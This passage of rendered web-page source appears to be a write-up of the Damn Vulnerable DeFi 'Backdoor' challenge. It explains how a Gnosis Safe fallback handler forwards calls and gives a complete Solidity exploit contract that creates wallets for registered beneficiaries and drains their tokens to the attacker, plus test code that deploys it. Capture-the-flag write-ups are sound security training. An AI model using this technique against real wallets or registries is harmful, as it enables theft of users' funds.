"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"calldatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"())"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// The msg.sender address is shifted to the left by 12 bytes to remove the padding"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Then the address without padding is stored right after the calldata"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"mstore"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"calldatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"shl"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"96"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"caller"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()))"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Add 20 bytes for the address appended add the end"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"let"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" success "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:":="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"call"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"gas"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" handler"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"add"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"calldatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"()"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"20"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"returndatacopy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"returndatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"())"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"if"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"iszero"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(success) {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"revert"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"returndatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"())"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        }"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"return"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"returndatasize"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"())"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    }"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"}"})})]})}),"\n",(0,n.jsxs)(e.p,{children:["It doesn't take much assembly knowledge to know that this is a ",(0,n.jsx)(e.code,{children:"call()"})," and not a ",(0,n.jsx)(e.code,{children:"delegatecall()"})," as I was hoping for."]}),"\n",(0,n.jsxs)(e.p,{children:["But wait! This still allows us to make arbitrary calls to a single address that we can freely choose. The ",(0,n.jsx)(e.em,{children:"GnosisSafe"})," contract does not have a ",(0,n.jsx)(e.em,{children:"transfer"})," function. So if we'd set the token address as fallback-handler and call ",(0,n.jsx)(e.code,{children:"transfer()"})," on the wallet, the wallet should call ",(0,n.jsx)(e.em,{children:"transfer"})," on the token. Since the token contract is being called by the wallet, the ",(0,n.jsx)(e.code,{children:"msg.sender"})," will be the wallet's address and therefore we can freely transfer tokens that belong to the wallet."]}),"\n",(0,n.jsx)(e.h2,{id:"exploit",children:"Exploit"}),"\n",(0,n.jsx)(e.p,{children:'The challenge description told us "to take all funds from the registry. In a single transaction." – therefore we\'ll need a smartcontract executing the entire exploitation:'}),"\n",(0,n.jsx)(e.pre,{"data-language":"solidity","data-theme":"default",filename:"BackdoorExploit.sol",hasCopyCode:!0,children:(0,n.jsxs)(e.code,{"data-line-numbers":"","data-language":"solidity","data-theme":"default","data-line-numbers-max-digits":"2",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"contract"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:" BackdoorExploit"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"constructor"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" registryAddress"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" masterCopyAddress"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"IGnosisSafeProxyFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" walletFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"IERC20"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" token"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"[] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"memory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" victims"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    ) {"})}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Create a wallet for each beneficiary."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"for"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" ("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"uint256"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" i "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"; i "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"<"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" victims.length; i"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"++"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:") {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" beneficiary "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" victims[i];"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"[] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"memory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" owners "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"new"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"[]("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"1"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            owners["}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" beneficiary;"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" wallet "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" walletFactory."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"createProxyWithCallback"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                masterCopyAddress"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"              "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Singleton, the Gnosis master copy"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                abi."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"encodeWithSelector"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(         "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Build initializer bytes array"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    IGnosisSafe.setup.selector"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Function signature to call, must be setup()"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    owners"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                     "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Must be exactly one of the registered beneficiaries"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"1"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                          "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Threshold, must be 1"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0x0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"               "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Optional delegate call address, don't care"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0x0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Optional delegate call data, don't care"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(token)"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"             "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Specify the Token as fallback handler"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0x0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"               "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Payment token, don't care"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                          "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Payment, don't care"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0x0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:")                "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Payment receiver, don't care"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                )"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// We don't care about the salt or what address the Wallet gets from it"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"                registryAddress "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Registry has the callback we want to exploit"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            );"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// Wallet should now have received the DVT Tokens from the callback."})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// We'll act as if the Wallet itself is a token,"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-comment)"},children:"// this transfer will be forwarded to the token contract."})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"            "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"IERC20"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(wallet)."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"transfer"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"(msg.sender"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"10"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"ether"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:");"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        }"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    }"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"}"})})]})}),"\n",(0,n.jsxs)(e.p,{children:["Then we adjust the ",(0,n.jsx)(e.a,{href:"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.1.0/test/backdoor/backdoor.challenge.js",children:"backdoor.challenge.js"})," to make a single transaction, the deployment of the exploit contract:"]}),"\n",(0,n.jsx)(e.pre,{"data-language":"javascript","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"javascript","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"it"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'Exploit'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"async"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"function"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" () {"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"const"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"ExploitFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"ethers"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:".getContractFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string-expression)"},children:"'BackdoorExploit'"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" attacker);"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-keyword)"},children:"await"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"ExploitFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:".deploy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"("})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        